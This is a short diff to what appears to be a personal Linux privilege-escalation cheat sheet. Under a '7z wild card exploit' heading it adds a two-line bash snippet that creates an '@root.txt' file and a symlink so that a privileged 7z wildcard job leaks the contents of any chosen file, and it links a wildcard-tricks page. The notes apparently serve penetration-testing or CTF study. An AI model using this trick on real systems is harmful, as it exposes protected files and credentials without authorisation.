@@ -129,6 +129,10 @@ systemctl cat nginx.service
 ```
 ---
 # 7z wild card exploit
+```bash
+touch @root.txt
+ln -s /file/you/want/to/read root.txt
+```
 - https://chinnidiwakar.gitbook.io/githubimport/linux-unix/privilege-escalation/wildcards-spare-tricks
 ---
 # tar wild card exploit
